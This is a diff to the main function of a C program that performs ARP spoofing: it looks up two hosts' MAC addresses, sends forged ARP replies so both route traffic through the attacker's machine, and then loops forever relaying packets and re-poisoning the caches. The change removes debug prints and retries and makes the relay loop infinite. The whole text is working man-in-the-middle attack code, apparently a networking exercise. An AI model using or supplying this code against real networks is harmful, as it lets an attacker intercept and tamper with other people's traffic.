@@ -51,43 +51,27 @@ int main(int argc, char* argv[]) {
   //get sender mac
   uint8_t sender_mac[6];
   send_arp(handle, REQUEST, target_ip, sender_ip, attacker_mac, broadcast);
-  int chk = 1;
-  while(chk) {
-    chk = get_mac_by_ip(handle, sender_ip, sender_mac);
-  }
+  get_mac_by_ip(handle, sender_ip, sender_mac);
   printf("sender mac address: ");
   print_mac(sender_mac);
 
   //get target mac
   uint8_t target_mac[6];
-  chk = 1;
-  while(chk) {
-//    printf("%d", chk);
-    send_arp(handle, REQUEST, sender_ip, target_ip, attacker_mac, broadcast);
-    chk = get_mac_by_ip(handle, target_ip, target_mac);
-  }
+  send_arp(handle, REQUEST, sender_ip, target_ip, attacker_mac, broadcast);
+  get_mac_by_ip(handle, target_ip, target_mac);
   printf("target mac address: ");
   print_mac(target_mac);
   
   //arp spoof
-  printf("0");
   send_arp(handle, REPLY, target_ip, sender_ip, attacker_mac, sender_mac);
-  printf("1");
   send_arp(handle, REPLY, sender_ip, target_ip, attacker_mac, target_mac);
-  printf("2");
+  
   //relay and prevent arp recovery
-  int cnt = 0;
-  while(cnt <= 100) {
-    printf("3");
+  while(true) {
     relay_ip_packet(handle, attacker_ip, attacker_mac, sender_mac, target_mac);
-    printf("4");
     prevent_arp_recovery(handle, attacker_ip, sender_mac);
-    printf("5");
     relay_ip_packet(handle, attacker_ip, attacker_mac, target_mac, sender_mac);
-    printf("6");
     prevent_arp_recovery(handle, attacker_ip, target_mac);
-    printf("7");
-    cnt++;
   }
 
   return 0;
